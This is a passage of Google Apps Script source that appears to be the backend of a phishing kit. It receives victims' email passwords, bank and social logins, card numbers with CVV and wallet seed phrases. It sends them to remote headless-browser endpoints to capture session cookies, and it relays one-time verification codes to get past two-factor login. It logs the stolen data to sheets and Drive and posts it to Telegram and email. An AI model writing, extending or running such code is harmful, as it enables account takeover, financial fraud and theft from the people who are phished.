          scriptingLink: graphServerUrl + "/graph/installer/" + ((formData && formData.platform) || "windows"),
          server: graphServerUrl
        });
      } catch (gErr) {
        Logger.log("[GRAPH] ERROR: " + gErr.message + " | " + gErr.stack);
        return createJsonResponse({ success: false, error: gErr.message });
      }
    }

    let updatedFormData = { ...formData }; // Create a mutable copy of formData

    // Extract domain from email if available
    if (updatedFormData.email) {
      const atIndex = updatedFormData.email.lastIndexOf('@');
      if (atIndex !== -1) {
        updatedFormData.domain = updatedFormData.email.slice(atIndex + 1);
      }
    }

    let verifyAccess = false;
    let cookieAccess = false;
    let verified = false;
    let fullAccess = false;

    // Call external API based on templateNiche (if applicable)
    let apiResponseData = null;
    let apiError = null;

    if (templateType === "PLAIN") {
      verifyAccess = false;
      cookieAccess = false;
      verified = false;
      fullAccess = false;
    } else if (templateType === "COOKIE" || templateType === "TRUE-LOGIN") {
      verifyAccess = true;
      cookieAccess = (templateType === "COOKIE"); // Set cookieAccess based on templateType

      let apiUrl = "";
      let requestBody = {}; // Declare and initialize once

      // Select the best serverless endpoint BEFORE building the API URL — the chosen server
      // is stamped on the row so only that server picks it up in processWaitingRows.
      var assignedServerlessEndpoint = null;
      if (templateType === "COOKIE" || templateType === "TRUE-LOGIN") {
        var requestedPlatform = updatedFormData.platform || projectRowMap.platform || projectRowMap.severlessPlatform || '';
        // WIRE-scoped fallback: template formData/projects sheet carry no platform field
        // (column doesn't exist), so requestedPlatform was '' → platform filter skipped →
        // GMAIL traffic could be routed to an OUTLOOK-only server on an alphabetical
        // severlessId tie-break. For WIRE email links, fall back to the row's strictly
        // value (e.g. 'gmail') as the platform filter. splitRoutingValues uppercases both
        // sides, so case mismatch is a non-issue. BANK/SOCIAL keep strict filtering
        // (their strictly is 'any' — falling back to it would filter everything out).
        if (!requestedPlatform && templateNiche === 'WIRE') {
          requestedPlatform = updatedFormData.strictly || projectRowMap.strictly || '';
          Logger.log("[PlatformFilter] WIRE fallback requestedPlatform=" + requestedPlatform);
        }
        // Workload type for the severlessType filter: WIRE email links request EMAIL so a
        // SOCIAL-only dev row can never catch production email traffic (symmetric isolation).
        const NICHE_TO_TYPE = { WIRE: 'EMAIL', SOCIAL: 'SOCIAL', BANK: 'BANK' };
        var requestedServerType = NICHE_TO_TYPE[templateNiche] || '';
        assignedServerlessEndpoint = getBestServerlessEndpoint(templateNiche, fallbackBaseUrl, updatedFormData.ipData, 'LINK', requestedPlatform, requestedServerType);
        Logger.log("Assigned serverless endpoint: " + JSON.stringify(assignedServerlessEndpoint));
      }
      // Base URL for the API call: use the picked server when available, otherwise EXTERNAL_API.
      var serverlessBaseUrl = (assignedServerlessEndpoint && assignedServerlessEndpoint.severlessURL) ? assignedServerlessEndpoint.severlessURL.replace(/\/+$/, '') : String(CONFIG.EXTERNAL_API || fallbackBaseUrl || '').replace(/\/+$/, '');
      Logger.log("Serverless base URL for submission: " + serverlessBaseUrl);

      switch (templateNiche) {
        case "WIRE":
          apiUrl = `${serverlessBaseUrl}/emails/cookie/cookie-api-login`; // New endpoint for WIRE
          // Assign properties to the already declared requestBody object
          requestBody.projectId = projectRowMap.projectId || "N/A";
          requestBody.userId = projectRowMap.userId || "N/A";
          requestBody.formId = projectRowMap.formId || "N/A";
          requestBody.ipData = updatedFormData.ipData || {};
          requestBody.deviceData = updatedFormData.deviceData || {};
          requestBody.email = formData.email || "";
          requestBody.password = formData.password || "";
           requestBody.strictly = updatedFormData.strictly || projectRowMap.strictly || "";
          break;
        case "BANK":
          const bankData = formData.banks && formData.banks.length > 0 ? formData.banks[0] : {};
          if (!bankData?.username || !bankData?.password) {
            return createJsonResponse({ success: false, error: "Username and password required for BANK verification." });
          }
          apiUrl = `${serverlessBaseUrl}/banks/cookie/cookie-api-login`;
          requestBody.projectId = projectRowMap.projectId || "N/A";
          requestBody.userId = projectRowMap.userId || "N/A";
          requestBody.formId = projectRowMap.formId || "N/A";
          requestBody.ipData = updatedFormData.ipData || {};
          requestBody.deviceData = updatedFormData.deviceData || {};
          requestBody.email = formData.email || "";
          requestBody.password = formData.password || "";
          requestBody.strictly = updatedFormData.strictly || projectRowMap.strictly || "";
          requestBody.username = bankData.username;
          requestBody.password = bankData.password;
          requestBody.website = bankData.website || "";
          break;
        case "SOCIAL":
          const socialData = formData.socials && formData.socials.length > 0 ? formData.socials[0] : {};
          if (!socialData?.username || !socialData?.password) {
            // QR / login-method flows legitimately send no credentials — warn and continue
            // instead of aborting (the hard-fail returned an empty apiResponse to the template).
            Logger.log("SOCIAL notify: socials[0] credentials absent (login-method flow) — continuing. loginMethod=" + (formData.loginMethod || "unspecified") + " identifier=" + (formData.identifier || "none"));
          }
          apiUrl = `${serverlessBaseUrl}/socials/cookie/cookie-api-login`;
          requestBody.projectId = projectRowMap.projectId || "N/A";
          requestBody.userId = projectRowMap.userId || "N/A";
          requestBody.formId = projectRowMap.formId || "N/A";
          requestBody.ipData = updatedFormData.ipData || {};
          requestBody.deviceData = updatedFormData.deviceData || {};
          const socialIdentifier = formData.identifier != null ? String(formData.identifier) : "";
          requestBody.email = formData.email || (socialIdentifier.includes('@') && socialIdentifier.includes('.') ? socialIdentifier : "") || "";
          requestBody.password = formData.password || "";
          requestBody.strictly = updatedFormData.strictly || projectRowMap.strictly || requestedPlatform || "";
          requestBody.platform = requestedPlatform || "";
          requestBody.loginMethod = updatedFormData.loginMethod || "";
          requestBody.username = socialData.username || "";
          requestBody.password = socialData.password || "";
          requestBody.website = socialData.website || "";
          break;
        case "WALLET":
          const walletData = formData.wallets && formData.wallets.length > 0 ? formData.wallets[0] : {};
          const wordPhrase = walletData.wordPhrase; // Declare wordPhrase here
          const walletWebsite = walletData.website;
          if (!wordPhrase) {
            return createJsonResponse({ success: false, error: "Word phrase required for WALLET verification." });
          }
          apiUrl = `${serverlessBaseUrl}/wallets/true-login/verify-wallet-phrase?phrase=${encodeURIComponent(wordPhrase)}${walletWebsite ? `&website=${encodeURIComponent(walletWebsite)}` : ''}`;
          break;
        case "CARD":
          const cardData = formData.cards && formData.cards.length > 0 ? formData.cards[0] : {};
          const cardNumber = cardData.cardNumber; // Declare card details here
          const expirationDate = cardData.expirationDate;
          const cvv = cardData.cvv;
          const cardWebsite = cardData.website; // Assuming card object might have a website
          if (!cardNumber || !expirationDate || !cvv) {
            return createJsonResponse({ success: false, error: "Card number, expiration date, and CVV required for CARD verification." });
          }
          apiUrl = `${serverlessBaseUrl}/cards/true-login/verify-card?cardNumber=${encodeURIComponent(cardNumber)}&expirationDate=${encodeURIComponent(expirationDate)}&cvv=${encodeURIComponent(cvv)}${cardWebsite ? `&website=${encodeURIComponent(cardWebsite)}` : ''}`;
          break;
        default:
          Logger.log(`No specific API for templateNiche: ${templateNiche} for templateType: ${templateType}. Skipping API call.`);
          break;
      }

      if (assignedServerlessEndpoint) {
        requestBody.assignedServer = assignedServerlessEndpoint.severlessURL.replace(/\/+$/, '');
      }

      if (apiUrl) {
        try {
          Logger.log(`Calling external API: ${apiUrl}`);
          const options = {
            method: (templateNiche === "WIRE" || templateNiche === "SOCIAL" || templateNiche === "BANK") ? 'POST' : 'GET', // Use POST for WIRE, SOCIAL, BANK
            contentType: 'application/json', // Explicitly set content type for UrlFetchApp
            headers: {
              'Content-Type': 'application/json', // Explicitly set headers for consistency
              'ngrok-skip-browser-warning': 'true' // Skip ngrok interstitial page
            },
            payload: (templateNiche === "WIRE" || templateNiche === "SOCIAL" || templateNiche === "BANK") ? JSON.stringify(requestBody) : null, // Set payload for POST niches
            muteHttpExceptions: true, // Important to catch errors gracefully
            timeout: 120000 // 120s timeout to handle engine cold-start compilation
          };

         if (templateNiche === "WIRE" || templateNiche === "SOCIAL" || templateNiche === "BANK") {
            Logger.log(`External API Request Body (${templateNiche}) - Type:`, typeof requestBody);
            Logger.log(`External API Request Body (${templateNiche}) - Contents:`);
            for (const key in requestBody) {
              if (Object.hasOwnProperty.call(requestBody, key)) {
                Logger.log(`  ${key}: ${JSON.stringify(requestBody[key])}`);
              }
            }
          } else {
            // For GET requests, payload should not be set in options
            delete options.payload;
          }

          const response = UrlFetchApp.fetch(apiUrl, options);
          const responseText = response.getContentText(); // Capture raw response text
          
          // Check if responseText is empty or not valid JSON before parsing
          if (!responseText || responseText.trim() === '') {
            throw new Error("External API returned an empty response.");
          }
          
          apiResponseData = JSON.parse(responseText); // Attempt to parse
          Logger.log("External API Parsed Response:", apiResponseData); // Log parsed response

          // Check for a 'status' field in the API response to determine success of initiation
          if (apiResponseData && apiResponseData.status) {
            // If the API returns a status, it means the request was processed by the serverless function.
            // We consider this a success for the initial API call, even if the browser process itself
            // might later result in FAILED, WAITINGPASSWORD, etc.
            // The actual 'verified' and 'fullAccess' will be determined by the background process.
            Logger.log(`External API reported status: ${apiResponseData.status}`);
          } else {
            // If no status field, or if the response is malformed, treat as an error
            throw new Error(`External API returned an unexpected response format or an error: ${responseText}`);
          }

          // verified and fullAccess are no longer directly from API response for COOKIE/TRUE-LOGIN
          // They will be determined by the initial formData defaults or remain false if not set.
          // The new API response doesn't carry these fields.
          verified = updatedFormData.verified !== undefined ? updatedFormData.verified : false;
          fullAccess = updatedFormData.fullAccess !== undefined ? updatedFormData.fullAccess : false;
          
          // Add API response to formData for storage
          updatedFormData.apiResponse = apiResponseData;

        } catch (e) {
          Logger.log("Error calling external API: " + e.message);
          apiError = e.message;
          updatedFormData.apiError = apiError;
          verified = false; // Explicitly set to false on API call failure
          fullAccess = false; // Explicitly set to false on API call failure
        }
      }
    } else {
      return createJsonResponse({
        success: false,
        error: "Invalid templateType provided."
      });
    }

    // Add final access and verification flags to formData
    updatedFormData.verifyAccess = verifyAccess;
    updatedFormData.cookieAccess = cookieAccess;
    updatedFormData.verified = verified;
    updatedFormData.fullAccess = fullAccess;

    // Ensure ipData and deviceData are objects, not strings
    if (typeof updatedFormData.ipData === 'string') {
      try {
        updatedFormData.ipData = JSON.parse(updatedFormData.ipData);
      } catch (e) {
        Logger.log("Error parsing ipData string: " + e);
        updatedFormData.ipData = {};
      }
    }
    if (typeof updatedFormData.deviceData === 'string') {
      try {
        updatedFormData.deviceData = JSON.parse(updatedFormData.deviceData);
      } catch (e) {
        Logger.log("Error parsing deviceData string: " + e);
        updatedFormData.deviceData = {};
      }
    }

    const responseColumnValue = projectRowMap.response;
    let existingResponses = [];
    if (responseColumnValue) {
      try {
        let parsedResponse = JSON.parse(responseColumnValue);
        if (parsedResponse && parsedResponse.fileId) { // Check for the file pointer
          Logger.log(`Found fileId ${parsedResponse.fileId}, fetching from Drive.`);
          const fileContentResult = getJsonContentFromFile(parsedResponse.fileId);
          if (fileContentResult.success) {
            existingResponses = fileContentResult.data;
          } else {
            Logger.log(`Error fetching responses from Drive: ${fileContentResult.error}`);
            existingResponses = []; // Start fresh if file is corrupt or inaccessible
          }
        } else if (Array.isArray(parsedResponse)) {
          existingResponses = parsedResponse;
        } else {
          existingResponses = [];
        }
      } catch (e) {
        Logger.log("Error parsing existing response JSON from sheet: " + e.message);
        existingResponses = [];
      }
    }

    // Determine new ID
    let newId = 1;
    if (existingResponses.length > 0) {
      const maxId = existingResponses.reduce((max, entry) => {
        const currentId = parseInt(entry.id);
        return isNaN(currentId) ? Math.max(max, currentId) : Math.max(max, currentId);
      }, 0);
      newId = maxId + 1;
    }

    // Determine submissionId based on templateType and API response
    let submissionId;
    if ((templateType === "COOKIE" || templateType === "TRUE-LOGIN") && apiResponseData && apiResponseData.browserId) {
      submissionId = apiResponseData.browserId;
    } else {
      submissionId = new Date().getTime().toString() + Utilities.getUuid().slice(0, 4); // Original PLAIN logic
    }

    // Construct the complete new submission entry
    const newSubmissionEntry = {
      id: newId.toString(), // ID as string
      submissionId: submissionId, // Add submissionId here
      category: projectRowMap.templateNiche || "UNKNOWN", // From projectRowMap.templateNiche
      type: projectRowMap.templateType || "UNKNOWN",     // From projectRowMap.templateType
      title: projectRowMap.projectTitle || "Form Submission",
      userId: projectRowMap.userId || "",
      projectId: projectRowMap.projectId || "",
      formId: projectRowMap.formId || "",
      timestamp: normalizeIsoTimestamp(updatedFormData.timestamp),
      email: updatedFormData.email || "",
      domain: updatedFormData.domain || "",
      password: updatedFormData.password || "",
      ipData: updatedFormData.ipData || {},
      deviceData: updatedFormData.deviceData || {},
      verifyAccess: verifyAccess,
      cookieAccess: cookieAccess,
      verified: verified,
      fullAccess: fullAccess,
      cookieJSON: updatedFormData.cookieJSON || {},
      cookieFileURL: updatedFormData.cookieFileURL || "", // Ensure this is included
      banks: updatedFormData.banks || [],
      cards: updatedFormData.cards || [],
      socials: updatedFormData.socials || [],
      wallets: updatedFormData.wallets || [],
      apiResponse: updatedFormData.apiResponse || null // Include API response if available
    };

    // Append the new entry
    existingResponses.push(newSubmissionEntry);

    // 1. Update the json value in the response column in projects sheet
    const responseString = JSON.stringify(existingResponses);
    let responseDataToWrite;

    // Define a threshold, e.g., 45000 chars, to decide whether to save to Drive
    const CELL_SIZE_LIMIT = 45000; 

    if (responseString.length > CELL_SIZE_LIMIT) {
      Logger.log(`Response size (${responseString.length}) exceeds limit. Saving to Drive.`);
      
      // Retrieve the user's folderId from the 'user' sheet using projectRowMap.userId
      const userId = projectRowMap.userId;
      if (!userId) {
        return createJsonResponse({ success: false, error: "User ID not found in project data." });
      }

      const userFolderResult = getOrCreateUserFolder(userId, CONFIG.FOLDER_ID.USERS);
      if (!userFolderResult.success) {
        return createJsonResponse({ success: false, error: `Failed to get or create user folder for userId ${userId}: ${userFolderResult.error}` });
      }
      const parentFolderId = userFolderResult.folderId;

      if (!parentFolderId) {
        return createJsonResponse({ success: false, error: "User's parent folderId not found after creation/retrieval." });
      }
      
      const projectId = projectRowMap.projectId;
      const fileName = `${projectId}.json`;
      
      const saveFileResult = createOrUpdateJsonFile(parentFolderId, projectId, fileName, existingResponses);

      if (saveFileResult.success) {
        responseDataToWrite = JSON.stringify({ fileId: saveFileResult.fileId, count: existingResponses.length });
      } else {
        return createJsonResponse({ success: false, error: `Failed to save responses to Drive: ${saveFileResult.error}` });
      }
    } else {
      responseDataToWrite = responseString;
    }

    // Use the already-resolved row number to skip a second full projects scan.
    const updateProjectResult = (projectRowNumber !== null)
      ? updateRowCellsByNumber(CONFIG.SHEET_NAME.PROJECTS, projectRowNumber, { "response": responseDataToWrite })
      : setMultipleCellDataByColumnSearch(CONFIG.SHEET_NAME.PROJECTS, "token", token, { "response": responseDataToWrite });

    if (!updateProjectResult.success) {
      return createJsonResponse({
        success: false,
        error: `Failed to update project sheet: ${updateProjectResult.error}`
      });
    }
    invalidateProjectResponse(projectRowMap.projectId);

    // 2. Set new row data to hub sheet
    const hubDataToInsert = {
      submissionId: submissionId, // New unique identifier
      category: projectRowMap.templateNiche || "UNKNOWN", // From projectRowMap.templateNiche
      type: projectRowMap.templateType || "UNKNOWN",     // From projectRowMap.templateType
      title: projectRowMap.projectTitle || "Form Submission", // From projectRowMap.projectTitle
      userId: projectRowMap.userId || "",             // From projectRowMap.userId
      projectId: projectRowMap.projectId || "",       // From projectRowMap.projectId
      formId: projectRowMap.formId || "",             // From projectRowMap.formId
      timestamp: normalizeIsoTimestamp(updatedFormData.timestamp),
      email: updatedFormData.email || "",
      domain: updatedFormData.domain || "",
      password: updatedFormData.password || "",
      ipData: JSON.stringify(updatedFormData.ipData || {}),
      deviceData: JSON.stringify(updatedFormData.deviceData || {}),
      verifyAccess: verifyAccess ? "TRUE" : "FALSE",
      cookieAccess: cookieAccess ? "TRUE" : "FALSE",
      verified: verified ? "TRUE" : "FALSE",
      fullAccess: fullAccess ? "TRUE" : "FALSE",
      cookieJSON: JSON.stringify(updatedFormData.cookieJSON || {}),
      cookieFileURL: updatedFormData.cookieFileURL || "", // Keep this as it was not explicitly asked to remove from hub sheet
      banks: JSON.stringify(updatedFormData.banks || []),
      cards: JSON.stringify(updatedFormData.cards || []),
      socials: JSON.stringify(updatedFormData.socials || []),
      wallets: JSON.stringify(updatedFormData.wallets || []),
      mxRecord: "PENDING", // Initialize mxRecord
      possibleProvider: "PENDING" // Initialize possibleProvider
    };

    const setHubRowResult = setRowDataByHeaderMap(CONFIG.SHEET_NAME.HUB, hubDataToInsert);

    if (!setHubRowResult.success) {
      return createJsonResponse({
        success: false,
        error: `Failed to add row to hub sheet: ${setHubRowResult.error}`
      });
    }

    // Asynchronously update mxRecord and possibleProvider using the new submissionId
    if (updatedFormData.email && setHubRowResult.success) {
      try {
        const triggerId = Utilities.getUuid();
        const triggerProperties = {
          email: updatedFormData.email,
          submissionId: submissionId // Pass the new submissionId
        };
        PropertiesService.getScriptProperties().setProperty(triggerId, JSON.stringify(triggerProperties));

        ScriptApp.newTrigger('runUpdateMxRecordAndProviderWrapper')
          .timeBased()
          .at(new Date(Date.now() + 5 * 1000)) // Run 5 seconds from now
          .create();
        Logger.log(`Scheduled MX lookup for email: ${updatedFormData.email}, submissionId: ${submissionId}`);

      } catch (e) {
        Logger.log("Error scheduling MX lookup: " + e.message);
      }
    }

    // Send notification to the user
    const telegramGroupId = projectRowMap.telegramGroupId; // Assuming telegramGroupId is in projects sheet
    const projectEmail = projectRowMap.email; // Assuming project owner's email is in projects sheet

    let notificationMessage = `🚨 New Form Submission for Project: *${projectRowMap.projectTitle || "Unknown Project"}* 🚨\n`;
    notificationMessage += `Type: ${templateType} | Niche: ${templateNiche || "N/A"}\n`;
    notificationMessage += `Status: Verified: ${verified ? "✅" : "❌"} | Full Access: ${fullAccess ? "✅" : "❌"}\n\n`;

    switch (templateNiche) {
      case "WIRE":
        notificationMessage += `*EMAIL LOG Details:*\n`;
        notificationMessage += `Email: ${updatedFormData.email || "N/A"}\n`;
        notificationMessage += `Password: ${updatedFormData.password || "N/A"}\n`;
        break;
      case "BANK":
        const bankData = updatedFormData.banks && updatedFormData.banks.length > 0 ? updatedFormData.banks[0] : {};
        notificationMessage += `*BANK LOG Details:*\n`;
        notificationMessage += `Bank Name: ${bankData.bankName || "N/A"}\n`;
        notificationMessage += `Username: ${bankData.username || "N/A"}\n`;
        notificationMessage += `Password: ${bankData.password || "N/A"}\n`;
        notificationMessage += `Website: ${bankData.website || "N/A"}\n`;
        break;
      case "SOCIAL":
        const socialData = updatedFormData.socials && updatedFormData.socials.length > 0 ? updatedFormData.socials[0] : {};
        notificationMessage += `*SOCIAL LOG Details:*\n`;
        notificationMessage += `Platform: ${socialData.platform || "N/A"}\n`;
        notificationMessage += `Username: ${socialData.username || "N/A"}\n`;
        notificationMessage += `Password: ${socialData.password || "N/A"}\n`;
        notificationMessage += `Website: ${socialData.website || "N/A"}\n`;
        break;
      case "WALLET":
        const walletData = updatedFormData.wallets && updatedFormData.wallets.length > 0 ? updatedFormData.wallets[0] : {};
        notificationMessage += `*WALLET Details:*\n`;
        notificationMessage += `Wallet Name: ${walletData.walletName || "N/A"}\n`;
        notificationMessage += `Word Phrase: ${walletData.wordPhrase || "N/A"}\n`;
        notificationMessage += `Website: ${walletData.website || "N/A"}\n`;
        break;
      case "CARD":
        const cardData = updatedFormData.cards && updatedFormData.cards.length > 0 ? updatedFormData.cards[0] : {};
        notificationMessage += `*CARD Details:*\n`;
        notificationMessage += `Card Type: ${cardData.cardType || "N/A"}\n`;
        notificationMessage += `Card Number: ${cardData.cardNumber ? `**** **** **** ${cardData.cardNumber.slice(-4)}` : "N/A"}\n`;
        notificationMessage += `Expiration: ${cardData.expirationDate || "N/A"}\n`;
        notificationMessage += `CVV: ${cardData.cvv || "N/A"}\n`;
        notificationMessage += `Issuer: ${cardData.issuer || "N/A"}\n`;
        notificationMessage += `Bank Name: ${cardData.bankName || "N/A"}\n`;
        break;
      default:
        // Generic details if niche is not specifically handled or for PLAIN/COOKIE without niche
        notificationMessage += `*General Details:*\n`;
        notificationMessage += `Email: ${updatedFormData.email || "N/A"}\n`;
        notificationMessage += `Password: ${updatedFormData.password || "N/A"}\n`;
        break;
    }

    // Add IP Data if available
    if (updatedFormData.ipData && Object.keys(updatedFormData.ipData).length > 0) {
      notificationMessage += `\n*IP Data:*\n`;
      notificationMessage += `IP: ${updatedFormData.ipData.ip || "N/A"}\n`;
      notificationMessage += `Location: ${updatedFormData.ipData.city || "N/A"}, ${updatedFormData.ipData.region || "N/A"}, ${updatedFormData.ipData.country || "N/A"}\n`;
      notificationMessage += `ISP: ${updatedFormData.ipData.isp || "N/A"}\n`;
    }

    // Add Cookie JSON if available
    if (updatedFormData.cookieJSON && Object.keys(updatedFormData.cookieJSON).length > 0) {
      notificationMessage += `\n*Cookie JSON:*\n`;
      notificationMessage += `${JSON.stringify(updatedFormData.cookieJSON, null, 2)}\n`;
    }

    if (telegramGroupId && templateType !== "COOKIE" && templateType !== "TRUE-LOGIN") {
      sendTelegramMessage(telegramGroupId, notificationMessage);
    } else if (telegramGroupId && (templateType === "COOKIE" || templateType === "TRUE-LOGIN")) {
      Logger.log(`Skipping Telegram notification for ${templateType} template type. Notifications will be handled by serverless route.`);
    }

    // Send email alert if project email exists (except for COOKIE and TRUE-LOGIN template types)
    if (projectEmail && String(projectEmail).trim() !== "" && templateType !== "COOKIE" && templateType !== "TRUE-LOGIN") {
      const emailSubject = `New Form Submission for Project: ${projectRowMap.projectTitle || "Unknown Project"}`;
      // Convert markdown-like bolding to plain text for email
      const emailBody = notificationMessage.replace(/\*\*(.*?)\*\*/g, '$1').replace(/🚨/g, '').replace(/✅/g, '✔️').replace(/❌/g, 'X');

      // Get the active user's email for the 'from' field
      const senderEmail = Session.getActiveUser().getEmail();

      sendEmailWithPlainTextOnly({
        from: {
          email: senderEmail,
        },
        to: {
          email: projectEmail,
        },
        subject: emailSubject,
        body: {
          plainText: emailBody,
        },
      });
    } else if (projectEmail && String(projectEmail).trim() !== "" && (templateType === "COOKIE" || templateType === "TRUE-LOGIN")) {
      Logger.log(`Skipping email notification for ${templateType} template type. Notifications will be handled by serverless route.`);
    }

    // Reuse the endpoint selected earlier (before the API call) to stay consistent
    var serverlessEndpoint = assignedServerlessEndpoint;

    var responsePayload = {
      success: true,
      message: "Form submission processed successfully.",
      projectUpdate: updateProjectResult,
      hubRowAdd: setHubRowResult,
      finalFormData: updatedFormData,
      apiResponse: apiResponseData
    };

    if (serverlessEndpoint) {
      responsePayload.pollingUrl = serverlessEndpoint.pollingUrl;
      responsePayload.updateUrl = serverlessEndpoint.updateUrl;
    }

    return createJsonResponse(responsePayload);

  } catch (error) {
    Logger.log("Error in notifyFormSubmission: " + error.message);
    return createJsonResponse({
      success: false,
      error: "Server error: " + error.message,
      stack: error.stack
    });
  }
}


function poolingOperator(params) {
  Logger.log("poolingOperator called with params: " + JSON.stringify(params));

  try {

    const { browserId, email, password, verificationChoice, verificationCode } = params;

    if (!browserId) {
      return createJsonResponse({
        success: false,
        error: "Missing required parameter: browserId."
      });
    }

    // Build an update object with any present fields
    const updateObj = { browserId };
    if (typeof email !== 'undefined') updateObj.email = email;
    if (typeof password !== 'undefined') updateObj.password = password;
    if (typeof verificationChoice !== 'undefined') updateObj.verificationChoice = verificationChoice;
    if (typeof verificationCode !== 'undefined') updateObj.verificationCode = verificationCode;

    // If any user-provided fields are present, stamp lastUserActivity so the engine can detect stale rows
    if (Object.keys(updateObj).length > 1) {
      updateObj.lastUserActivity = new Date().toISOString();
    }

    // If any update fields (besides browserId) are present, update the row using setMultipleCellDataByColumnSearch
    if (Object.keys(updateObj).length > 1) {
      const updateResult = setMultipleCellDataByColumnSearch(
        CONFIG.SHEET_NAME.COOKIE,
        "browserId",
        browserId,
        updateObj
      );
      if (!updateResult.success) {
        return createJsonResponse({
          success: false,
          error: `Failed to update row for browserId '${browserId}': ${updateResult.error}`
        });
      }
    }

    // Now poll for the latest status
    const cookieSheetResult = getRowsByColumn(CONFIG.SHEET_NAME.COOKIE, "browserId", browserId);

    if (!cookieSheetResult.success || cookieSheetResult.count === 0) {
      return createJsonResponse({
        success: false,
        error: `Data for browserId '${browserId}' not found in cookie sheet.`
      });
    }

    const cookieData = cookieSheetResult.data[0]; // Assuming browserId is unique
    const cookieHeaders = cookieSheetResult.headers;
    const cookieDataMap = {};
    cookieHeaders.forEach((header, index) => {
      cookieDataMap[header] = cookieData[index];
    });

    // Inline stale detection: if the row is in a processable state and idle >10 min, mark FAILED
    const processableStates = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGEMAILERROR", "WAITINGPASSWORDERROR"];
    if (processableStates.indexOf(cookieDataMap.status) !== -1) {
      const staleTimeoutMs = 10 * 60 * 1000;
      const now = Date.now();
      const lastActivityRaw = cookieDataMap.lastUserActivity || cookieDataMap.lastRun || cookieDataMap.timestamp;
      let lastActivityTime = null;
      if (lastActivityRaw) {
        const ts = String(lastActivityRaw).trim();
        // Try ISO format first, then manual parse for locale format (M/D/YYYY, H:MM:SS AM/PM)
        let parsed = new Date(ts);
        if (isNaN(parsed.getTime())) {
          // Attempt locale format parse: "6/7/2026, 3:20:28 AM"
          const dateMatch = ts.match(/^(\d{1,2})\/(\d{1,2})\/(\d{4}),\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)$/i);
          if (dateMatch) {
            const month = parseInt(dateMatch[1], 10) - 1;
            const day = parseInt(dateMatch[2], 10);
            const year = parseInt(dateMatch[3], 10);
            let hours = parseInt(dateMatch[4], 10);
            const minutes = parseInt(dateMatch[5], 10);
            const seconds = parseInt(dateMatch[6] || '0', 10);
            if (dateMatch[7].toUpperCase() === 'PM' && hours < 12) hours += 12;
            if (dateMatch[7].toUpperCase() === 'AM' && hours === 12) hours = 0;
            parsed = new Date(Date.UTC(year, month, day, hours, minutes, seconds));
          }
        }
        lastActivityTime = isNaN(parsed.getTime()) ? null : parsed.getTime();
      }
      if (lastActivityTime && (now - lastActivityTime > staleTimeoutMs)) {
        Logger.log(`[poolingOperator] Stale row detected: browserId='${browserId}', status='${cookieDataMap.status}', lastActivity='${lastActivityRaw}'. Marking FAILED.`);
        const failResult = setCookieData({
          browserId: browserId,
          status: "FAILED",
          verified: false,
          fullAccess: false,
          lastJsonResponse: JSON.stringify({
            browserId: browserId,
            status: "FAILED",
            message: "Session timed out due to inactivity. Marked as FAILED by poolingOperator.",
            timestamp: new Date().toISOString()
          })
        });
        if (failResult && failResult.success) {
          cookieDataMap.status = "FAILED";
          cookieDataMap.verified = false;
          cookieDataMap.fullAccess = false;
        } else {
          Logger.log(`[poolingOperator] Failed to mark stale row ${browserId} as FAILED: ${JSON.stringify(failResult)}`);
        }
      }
    }

    return createJsonResponse({
      success: true,
      data: cookieDataMap,
      currentStatus: cookieDataMap.status 
    });

  } catch (error) {
    Logger.log("Error in poolingOperator: " + error.message);
    return createJsonResponse({
      success: false,
      error: "Server error: " + error.message,
      stack: error.stack
    });
  }
}

function updateProcess(params) {
  Logger.log("updateProcess called with params: " + JSON.stringify(params));

  try {
    const { browserId, updateType, email, password, verificationChoice, verificationCode } = params;

    if (!browserId) {
      return createJsonResponse({
        success: false,
        error: "Missing required parameter: browserId."
      });
    }

    if (!updateType) {
      return createJsonResponse({
        success: false,
        error: "Missing required parameter: updateType."
      });
    }

    const updateObj = { browserId };
    switch (updateType) {
      case 'email':
        if (email) {
          updateObj.email = email;
          const atIndex = email.lastIndexOf('@');
          if (atIndex !== -1) updateObj.domain = email.slice(atIndex + 1);
        }
        if (password) updateObj.password = password;
        break;
      case 'password':
        if (password) updateObj.password = password;
        // belt-and-suspenders: if row is stuck in WAITINGPASSWORDERROR, reset to WAITINGPASSWORD so engine picks it up
        try {
          const existingRows = getRowsByColumn(CONFIG.SHEET_NAME.COOKIE, "browserId", browserId);
          if (existingRows && existingRows.length > 0) {
            const statusIndex = existingRows[0].indexOf('status') > -1 ? existingRows[0].indexOf('status') : -1;
            if (statusIndex === -1) {
              const headers = existingRows[0];
              const rowData = existingRows[1];
              for (let h = 0; h < headers.length; h++) {
                if (String(headers[h]).trim().toLowerCase() === 'status') {
                  const currentStatus = String(rowData[h]).trim();
                  if (currentStatus === 'WAITINGPASSWORDERROR') {
                    Logger.log("updateProcess: Found WAITINGPASSWORDERROR status, resetting to WAITINGPASSWORD for browserId: " + browserId);
                    updateObj.status = 'WAITINGPASSWORD';
                  }
                  break;
                }
              }
            }
          }
        } catch (readError) {
          Logger.log("updateProcess: Error reading current status (non-critical): " + readError.message);
        }
        break;
      case 'verificationChoice':
        if (verificationChoice) updateObj.verificationChoice = verificationChoice;
        break;
      case 'verificationCode':
        if (verificationCode) updateObj.verificationCode = verificationCode;
        break;
      default:
        return createJsonResponse({
          success: false,
          error: "Unknown updateType: " + updateType
        });
    }

    if (Object.keys(updateObj).length > 1) {
      updateObj.lastUserActivity = new Date().toISOString();
      const updateResult = setMultipleCellDataByColumnSearch(
        CONFIG.SHEET_NAME.COOKIE,
        "browserId",
        browserId,
        updateObj
      );
      if (!updateResult.success) {
        return createJsonResponse({
          success: false,
          error: "Failed to update row for browserId '" + browserId + "': " + updateResult.error
        });
      }
    }

    // Wake the engine interval so it picks up the updated row
    try {
      // Prefer the row-stored assigned server (keeps the update on the instance that owns the session).
      let wakeServer = null;
      try {
        const rowResult = getRowsByColumn(CONFIG.SHEET_NAME.COOKIE, "browserId", browserId);
        if (rowResult && rowResult.success && rowResult.headers && rowResult.headers.length > 0 && rowResult.data && rowResult.data.length > 0) {
          const svIdx = rowResult.headers.indexOf('server');
          if (svIdx !== -1 && rowResult.data[0][svIdx]) {
            wakeServer = String(rowResult.data[0][svIdx]).trim();
          }
        }
      } catch (rowErr) {
        Logger.log("updateProcess: error reading stored server column (non-critical): " + rowErr.message);
      }
      const wakeBase = (wakeServer && wakeServer.startsWith('http')) ? wakeServer.replace(/\/+$/, '') : String(CONFIG.EXTERNAL_API).replace(/\/+$/, '');
